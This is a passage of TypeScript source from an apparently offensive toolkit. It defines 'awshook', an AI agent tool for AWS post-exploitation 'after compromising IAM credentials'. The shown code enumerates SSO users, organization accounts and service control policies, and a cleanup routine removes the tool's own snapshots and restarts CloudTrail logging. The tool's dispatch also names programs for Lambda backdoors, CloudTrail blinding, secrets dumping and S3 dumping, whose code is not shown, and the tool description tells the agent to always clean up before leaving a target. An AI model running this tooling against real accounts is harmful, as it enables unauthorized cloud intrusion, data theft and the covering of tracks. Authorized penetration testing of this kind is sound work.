    const psArns = tryJson(permSets.stdout)?.PermissionSets || []
    output.push(`[+] Permission Sets: ${psArns.length}`)
    for (const psArn of psArns) {
      const desc = await aws(["sso-admin", "describe-permission-set", "--instance-arn", targetArn, "--permission-set-arn", psArn], profile, region, timeout)
      if (desc.exitCode === 0) {
        const ps = tryJson(desc.stdout)?.PermissionSet || {}
        output.push(`    ${ps.Name} — session: ${ps.SessionDuration || "default"} — ${psArn}`)
        if (ps.Name === "AdministratorAccess" || ps.Name === "PowerUserAccess") {
          findings.push({
            checkId: `AWS-SSO-${findings.length + 1}`, provider: "aws", severity: "high", status: "FOUND",
            resource: psArn, title: `High-privilege permission set: ${ps.Name}`,
            details: `SSO permission set ${ps.Name} grants broad access`,
            remediation: "Review who is assigned this permission set",
          })
        }
      }
    }
  }

  if (identityStoreId) {
    const users = await aws(["identitystore", "list-users", "--identity-store-id", identityStoreId], profile, region, timeout)
    if (users.exitCode === 0) {
      const userList = tryJson(users.stdout)?.Users || []
      output.push(`\n[+] Identity Store Users: ${userList.length}`)
      for (const u of userList.slice(0, 30)) {
        output.push(`    ${u.UserName || u.UserId} — ${u.DisplayName || ""} — ${u.Emails?.[0]?.Value || "no email"}`)
      }
    }

    const groups = await aws(["identitystore", "list-groups", "--identity-store-id", identityStoreId], profile, region, timeout)
    if (groups.exitCode === 0) {
      const groupList = tryJson(groups.stdout)?.Groups || []
      output.push(`\n[+] Identity Store Groups: ${groupList.length}`)
      for (const g of groupList) output.push(`    ${g.DisplayName} — ${g.GroupId}`)
    }
  }

  const accounts = await aws(["organizations", "list-accounts", "--query", "Accounts[].[Id,Name,Status]"], profile, region, timeout)
  if (accounts.exitCode === 0) {
    const acctList = tryJson(accounts.stdout) || []
    output.push(`\n[+] Organization Accounts: ${acctList.length}`)
    for (const a of acctList.slice(0, 20)) output.push(`    ${a[0]} — ${a[1]} (${a[2]})`)
  }

  return { output: output.join("\n"), findings }
}

async function orgEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] AWS Organizations Enumeration\n"]

  const org = await aws(["organizations", "describe-organization"], profile, region, timeout)
  if (org.exitCode !== 0) return { output: `[-] Cannot describe organization: ${org.stderr.trim()}\n[*] This account may not be part of an Organization`, findings }

  const orgInfo = tryJson(org.stdout)?.Organization || {}
  output.push(`[+] Organization: ${orgInfo.Id}`)
  output.push(`    Master Account: ${orgInfo.MasterAccountId} (${orgInfo.MasterAccountEmail})`)
  output.push(`    Feature Set: ${orgInfo.FeatureSet}`)

  const accounts = await aws(["organizations", "list-accounts"], profile, region, timeout)
  if (accounts.exitCode === 0) {
    const acctList = tryJson(accounts.stdout)?.Accounts || []
    output.push(`\n[+] Accounts: ${acctList.length}`)
    for (const a of acctList) {
      output.push(`    ${a.Id} — ${a.Name} (${a.Status}) — ${a.Email}`)
      if (a.Id === orgInfo.MasterAccountId) output.push(`      ^ MANAGEMENT ACCOUNT`)
    }
    findings.push({
      checkId: "AWS-ORG-001", provider: "aws", severity: "info", status: "ENUMERATED",
      resource: `org:${orgInfo.Id}`, title: `AWS Organization enumerated: ${acctList.length} accounts`,
      details: `Management account: ${orgInfo.MasterAccountId}, feature set: ${orgInfo.FeatureSet}`,
      remediation: "Review cross-account trust policies and SCPs",
    })
  }

  const roots = await aws(["organizations", "list-roots"], profile, region, timeout)
  if (roots.exitCode === 0) {
    const rootList = tryJson(roots.stdout)?.Roots || []
    for (const root of rootList) {
      output.push(`\n[+] Root: ${root.Id} (${root.Name})`)
      const enabledPolicies = (root.PolicyTypes || []).filter((p: Record<string, string>) => p.Status === "ENABLED")
      output.push(`    Enabled policy types: ${enabledPolicies.map((p: Record<string, string>) => p.Type).join(", ") || "none"}`)

      const ous = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", root.Id], profile, region, timeout)
      if (ous.exitCode === 0) {
        const ouList = tryJson(ous.stdout)?.OrganizationalUnits || []
        output.push(`    OUs: ${ouList.length}`)
        for (const ou of ouList) {
          output.push(`      ${ou.Id} — ${ou.Name}`)
          const childOus = await aws(["organizations", "list-organizational-units-for-parent", "--parent-id", ou.Id], profile, region, timeout)
          if (childOus.exitCode === 0) {
            const children = tryJson(childOus.stdout)?.OrganizationalUnits || []
            for (const child of children) output.push(`        ${child.Id} — ${child.Name}`)
          }
        }
      }
    }
  }

  const scps = await aws(["organizations", "list-policies", "--filter", "SERVICE_CONTROL_POLICY"], profile, region, timeout)
  if (scps.exitCode === 0) {
    const scpList = tryJson(scps.stdout)?.Policies || []
    output.push(`\n[+] Service Control Policies: ${scpList.length}`)
    for (const scp of scpList) {
      output.push(`    ${scp.Id} — ${scp.Name} (${scp.AwsManaged ? "AWS Managed" : "Custom"})`)
      if (!scp.AwsManaged) {
        const content = await aws(["organizations", "describe-policy", "--policy-id", scp.Id, "--query", "Policy.Content"], profile, region, timeout)
        if (content.exitCode === 0) {
          const doc = tryJson(tryJson(content.stdout) || "{}")
          const statements = doc?.Statement || []
          const denies = statements.filter((s: Record<string, string>) => s.Effect === "Deny")
          output.push(`      Statements: ${statements.length} (${denies.length} deny)`)
        }
      }
    }
  }

  const delegated = await aws(["organizations", "list-delegated-administrators"], profile, region, timeout)
  if (delegated.exitCode === 0) {
    const delList = tryJson(delegated.stdout)?.DelegatedAdministrators || []
    if (delList.length > 0) {
      output.push(`\n[+] Delegated Administrators: ${delList.length}`)
      for (const d of delList) output.push(`    ${d.Id} — ${d.Name} — ${d.Email}`)
    }
  }

  return { output: output.join("\n"), findings }
}

async function cleanupAws(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike AWS cleanup — ${mode}\n`]

  const snaps = await aws(["ec2", "describe-snapshots", "--owner-ids", "self", "--filters", "Name=tag:CreatedBy,Values=CyberStrike", "--query", "Snapshots[].SnapshotId"], profile, region, timeout)
  if (snaps.exitCode === 0) {
    const snapList = tryJson(snaps.stdout) || []
    output.push(`[+] Snapshots to clean: ${snapList.length}`)
    for (const s of snapList) {
      if (dryRun) { output.push(`    Would delete: ${s}`) }
      else {
        await aws(["ec2", "delete-snapshot", "--snapshot-id", s], profile, region, timeout)
        output.push(`    Deleted: ${s}`)
      }
    }
  }

  const rdsSnaps = await aws(["rds", "describe-db-snapshots", "--query", "DBSnapshots[?contains(DBSnapshotIdentifier,'cs-snap-')].[DBSnapshotIdentifier]"], profile, region, timeout)
  if (rdsSnaps.exitCode === 0) {
    const rdsList = tryJson(rdsSnaps.stdout) || []
    output.push(`[+] RDS snapshots to clean: ${rdsList.length}`)
    for (const s of rdsList) {
      const snapId = s[0]
      if (dryRun) { output.push(`    Would delete: ${snapId}`) }
      else {
        await aws(["rds", "delete-db-snapshot", "--db-snapshot-identifier", snapId], profile, region, timeout)
        output.push(`    Deleted: ${snapId}`)
      }
    }
  }

  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name]"], profile, region, timeout)
  if (trails.exitCode === 0) {
    for (const t of (tryJson(trails.stdout) || [])) {
      const status = await aws(["cloudtrail", "get-trail-status", "--name", t[0]], profile, region, timeout)
      const s = tryJson(status.stdout)
      if (!s?.IsLogging) {
        if (dryRun) { output.push(`    Would restart logging: ${t[0]}`) }
        else {
          await aws(["cloudtrail", "start-logging", "--name", t[0]], profile, region, timeout)
          output.push(`[+] Restarted logging: ${t[0]}`)
        }
      }
    }
  }

  output.push(`\n[*] Cleanup ${mode} complete`)
  return { output: output.join("\n"), findings: [] }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const AwshookTool = Tool.define("awshook", {
  description: `Execute an AWS post-exploitation program after compromising IAM credentials or EC2 instance. Uses aws CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_aws before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "AWS program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    const check = await run("which", ["aws"], 5)
    if (check.exitCode !== 0) {
      return {
        title: `awshook: ${params.program}`,
        output: "AWS CLI not found. Install: https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
    }

    const wrap = (fn: () => Promise<string>): (() => Promise<HookResult>) => async () => ({ output: await fn(), findings: [] })

    const dispatch: Record<Program, () => Promise<HookResult>> = {
      iam_enum: () => iamEnum(params.args, params.timeout_seconds),
      iam_privesc: () => iamPrivesc(params.args, params.timeout_seconds),
      s3_dump: () => s3Dump(params.args, params.timeout_seconds),
      lambda_backdoor: () => lambdaBackdoor(params.args, params.timeout_seconds),
      ssm_exec: () => ssmExec(params.args, params.timeout_seconds),
      metadata_harvest: () => metadataHarvest(params.args),
      cloudtrail_blind: () => cloudtrailBlind(params.args, params.timeout_seconds),
      secrets_dump: () => secretsDump(params.args, params.timeout_seconds),
      ec2_snapshot: () => ec2Snapshot(params.args, params.timeout_seconds),
      rds_dump: () => rdsDump(params.args, params.timeout_seconds),
      ecs_exec: () => ecsExec(params.args, params.timeout_seconds),
      sso_enum: () => ssoEnum(params.args, params.timeout_seconds),
      org_enum: () => orgEnum(params.args, params.timeout_seconds),
      cleanup_aws: () => cleanupAws(params.args, params.timeout_seconds),
    }

    try {
      const result = await dispatch[params.program]()
      return {
        title: `awshook: ${params.program}`,
        output: result.output,
        metadata: { program: params.program, findings: result.findings },
      }
    } catch (e) {
      return {
        title: `awshook: ${params.program}`,
        output: `Error: ${e instanceof Error ? e.message : String(e)}`,
        metadata: { program: params.program, findings: [] },
      }
    }
  },
})
